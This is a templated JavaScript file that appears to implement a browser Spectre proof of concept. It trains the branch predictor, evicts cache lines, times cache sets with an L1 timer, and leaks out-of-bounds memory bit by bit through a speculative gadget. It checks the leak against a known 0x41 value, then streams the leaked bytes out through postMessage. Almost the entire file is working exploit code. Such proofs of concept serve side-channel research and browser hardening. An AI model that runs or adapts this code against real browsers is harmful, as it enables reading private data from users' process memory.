{% include 'setup_memory.js' %}

{% include 'constants.js' %}

{% include 'log.js' %}

{% include 'l1timer.js' %}

{% include 'leak_array_offset.js' %}

{% include 'eviction.js' %}

const ARRAYOFFSET = 0x200;

const ERR_MEM_LAYOUT = 0;
const ERR_U8_ALIGN = 1;
const ERR_NO_41 = 2;

function sleep(ms) {
  return new Promise(r=>setTimeout(r, ms));
}

function alignedArrayBuffer(sz) {
  const wasm_pages = Math.ceil(sz/(64*1024));
  return new WebAssembly.Memory({initial: wasm_pages, maximum: wasm_pages}).buffer
}

Object.defineProperty(this, "spectreTimer", {
  value: new L1Timer()
});

const cacheset0 = spectreTimer._cachesets(32)[0];
const probeArray = new Uint32Array(spectreTimer._outputdatabuffer());

probeArray[0x0] = 0x0;
probeArray[0x1] = 0x51;
probeArray[0x51] = 0x121;
probeArray[0x121] = 0x260;
probeArray[0x260] = 0x2000 + ARRAYOFFSET; // THIS IS ADDRESS A
probeArray[0x2000 + ARRAYOFFSET] = 0;

probeArray[0x2] = 0x52;
probeArray[0x52] = 0x122;
probeArray[0x122] = 0x360;
probeArray[0x360] = cacheset0/4; // THIS IS ADDRESS B
probeArray[cacheset0/4] = 0;

let IndexArray_500 = new Array(498);
let IndexArray_150 = new Array(148);
let IndexArray_250 = new Array(248);
let IndexArray_50 = new Array(48);
for (let i = 0; i < 498; i++) {
  IndexArray_500[i] = i + 1;
}
IndexArray_500.sort(() => Math.random() - 0.5);
for (let i = 0; i < 148; i++) {
  IndexArray_150[i] = i + 1;
}
IndexArray_150.sort(() => Math.random() - 0.5);
for (let i = 0; i < 248; i++) {
  IndexArray_250[i] = i + 1;
}
IndexArray_250.sort(() => Math.random() - 0.5);
for (let i = 0; i < 48; i++) {
  IndexArray_50[i] = i + 1;
}
IndexArray_50.sort(() => Math.random() - 0.5);

const spectreArgs = new Uint32Array([0, 0, 0]);
function spectreGadget(trash) {
  // We want to access as little memory as possible to avoid false positives.
  // Putting arguments in a global array seems to work better than passing them
  // as parameters.
  let idx = spectreArgs[0]|0;
  const bit = spectreArgs[1]|0;
  const waaaaaat = spectreArgs[2]|0;
  let trash1 = 1;
  let trash2 = 2;

  // Add a loop to control the state of the branch predictor
  // I.e. we want the last n branches taken/not taken to be consistent
  for (let i = 0; i < {{ gadget_loop_reps }}; i++);

  for (let i = 0; i < 5; i++) {
    trash1 = probeArray[trash1];
    trash2 = probeArray[trash2];
  }
  
  // need to return a 0 value, otherwise will cause crash;
  return (probeArray[idx < spectreArray.length ?
    (0x360 - (((spectreArray[idx]>>bit)&1) << 8)) : 0x100]&0x1) + trash1 + trash2;
}

function testBit(evict_lists, offset, bit, bitValue, noopt = true) {
  spectreArgs[0] = 0;
  spectreArgs[1] = 0;

  // Run the gadget twice to train the branch predictor.
  for (let j = 0; j < {{ training_reps }}; j++) {
    spectreGadget();
  }

  // Try to evict the length field of our array from memory, so that we can
  // speculate over the length check.
  for (let i = 1; i < evict_lists.length; i++)
    evict_lists[i].traverse();

  spectreArgs[0] = offset;
  spectreArgs[1] = bit;

  // In the gadget, we access cacheSet 0 if the bit was 0 and set 32 for bit 1.
  // const timing = spectreTimer.timeCacheSet(bitValue == 1 ? 32 : 0);
  const timing = spectreTimer.timeCacheSet(32);
  // log(`timing = ${timing}, bitvalue = ${bitValue}`);
  
  if (timing > {{ cache_threshold }}) {
    return true;
  } else if (noopt) {
    return false;
  }

  // This is never reached, but the compiler doesn't know.
  // The gadget breaks if this function gets optimized. So we add garbage
  // instructions to blow up the byte code size and disable optimization.
  {{ noopt_code }}
}

function leakBit(evict_lists, offset, bit) {
  let ones = 0;

  // Our leak is probabilistic. To filter out some noise, we test both for bit 0
  // and 1 repeatedly. If we didn't get a difference in cache hits, continue
  // until we see a diff.
  for (let i = 0; i < {{ min_leak_reps }}*10; i++) {
    // if (testBit(evict_lists, offset, bit, 0)) zeroes++;
    if (testBit(evict_lists, offset, bit, 1)) ones++;
  }
  return ones > {{ min_leak_reps }}*5;
}

function leakByte(evict_lists, offset) {
  let byte = 0;
  for (let bit = 0; bit < 8; bit++) {
    byte |= leakBit(evict_lists, offset, bit) << bit;
  }
  return byte;
}

function leakQword(evict_lists, offset) {
  let qword = 0n;
  for (let i = 0; i < 8; i++) {
    qword |= BigInt(leakByte(evict_lists, offset+i)) << BigInt(8*i);
  }
  return qword;
}

async function runSpectre() {
  const arrayPageOffset = (PAGE_SZ + inferredCacheSet*CACHE_LINE_SZ - alignedIndex*elementSize) % PAGE_SZ;
  log(`[*] array elements page offset: 0x${(arrayPageOffset).toString(16)}`);

  // We want the backing store ptr and the length of the typed array to be on separate cache lines.
  const desiredAlignment = 2*CACHE_LINE_SZ - ({{ backing_store_ptr_offset }});
  let typedArrayPageOffset = (arrayPageOffset + leakMe.length*4) % PAGE_SZ;
  log(`[*] first typedArray at 0x${typedArrayPageOffset.toString(16)}`);

  // We prepared a memory layout in setup_memory.js that looks like this:
  // leakMe | typedArray[0] | typedArrayBackingStore[0] | typedArray[1] | typedArrayBackingStore[1] | ...
  // Just iterate through them to find one that has the alignment we want.
  let alignedTypedArray = undefined;
  for (let i = 0; i < typedArrays.length-1; i++) {
    if (typedArrayPageOffset % (2*CACHE_LINE_SZ) == desiredAlignment) {
      log(`[*] found typedArray with desired alignment (@0x${typedArrayPageOffset.toString(16)})`);
      alignedTypedArray = typedArrays[i];
      alignedTypedArray.fill(0x41);
      const targetArray = typedArrays[i+1];
      // Fill all arrays before and after with 0x41 so that we can see them in
      // the hexdump.
      // We also use it as a known value to test if our leak works.
      for (let j = 0; j < i; j++) {
        typedArrays[j].fill(0x41);
      }
      for (let j = i+1; j < typedArrays.length; j++) {
        typedArrays[j].fill(0x41);
      }
      break;
    }
    typedArrayPageOffset += {{ typed_array_offset }};
    typedArrayPageOffset %= PAGE_SZ;
  }
  if (alignedTypedArray == undefined) {
    err(ERR_U8_ALIGN, "couldn't create typed array with right alignment");
    return;
  }

  // Create these as globals.
  // The spectreArray is what we will access out of bounds.
  // The spectreTimer calls the spectre gadget and checks which cache sets it's using.
  Object.defineProperty(this, "spectreArray", {
      value: alignedTypedArray
  });
  const wasm_spectreGadget = spectreTimer._createwasm(spectreGadget);
  spectreTimer._setwasm(wasm_spectreGadget);
  for (let i = 0; i < 100000; i++)
  spectreGadget();
  spectreTimer._initialize();

  const cacheLineToFlush = typedArrayPageOffset & 0xfc0;
  // This will be used to evict the typed array length from the cache
  // const evictionList = new EvictionList({{ eviction_list_size }}, cacheLineToFlush);

  // Test that the leak is working. We previously wrote byte 0x41 at a known offset.
  const leakTestReps = {{ leak_test_reps }};
  let falsePositives = 0;
  let falseNegatives = leakTestReps;

  let evict_lists = [];
  const address_set = [4*0x0, 4*0x51, 4*0x121, 4*0x260, 4*0x360];
  for (address of address_set) {
    evict_lists.push(new EvictionList(150, address, IndexArray_150));
  }

  for (let i = 0; i < leakTestReps; i++) {
    // The expected value is 0x41
    falseNegatives -= leakBit(evict_lists, 0, 0);
    falsePositives += leakBit(evict_lists, 0, 1);
  }
  const falsePositivePercent = Math.floor(100*falsePositives/leakTestReps);
  const falseNegativePercent = Math.floor(100*falseNegatives/leakTestReps);
  log(`[*] false positives: ${falsePositivePercent}%, false negatives: ${falseNegativePercent}%`);

  if (falsePositivePercent > {{ accepted_false_positive_percent }}) {
    err(ERR_NO_41, 'too many wrong false positives in leak test (> {{ accepted_false_positive_percent }}%)');
    return;
  }
  if (falseNegativePercent > {{ accepted_false_negative_percent }}) {
    err(ERR_NO_41, 'too many wrong false negatives in leak test (> {{ accepted_false_negative_percent }}%)');
    return;
  }

  evict_lists.push(new EvictionList(500, cacheLineToFlush, IndexArray_500));

  log('[*] setup complete, start leaking');
  
  await sleep(50);

  const leakCount = {{ leak_count }};
  const reportSize = {{ report_size }};
  let leaked = [];

  let time = performance.now();
  for (let leakOffset = 0; leakOffset < leakCount/10; leakOffset++) {
    if (leaked.length == reportSize) {
      postMessage({type: 'memory', mem: leaked, offset: leakOffset - leaked.length, time: performance.now() - time});
      await sleep(10);
      leaked = [];
      time = performance.now()
    }
    leaked.push(leakByte(evict_lists, leakOffset));
  }
  if (leaked.length > 0) {
    postMessage({type: 'memory', mem: leaked, offset: leakCount - leaked.length, time: performance.now() - time});
  }

  log('[*] done');
}

if (leakSuccess) {
  log(`[*] inferred memory layout: array index ${alignedIndex} is in cacheSet ${inferredCacheSet}`);
  let temp_stable_timer = {{stable_timer}};
  let temp_leak_test_reps = {{leak_test_reps}};
  let temp_min_leak_reps = {{min_leak_reps}};
  let temp_cache_threshold = {{cache_threshold}};

  // To verify, you can search for the value 0x26700000266e in a debugger
  leakMe[alignedIndex] = 0x1337;
  leakMe[alignedIndex+1] = 0x1338;

  runSpectre();
} else {
  err(ERR_MEM_LAYOUT, "could not infer memory layout", {cacheHits: cacheHits});
}
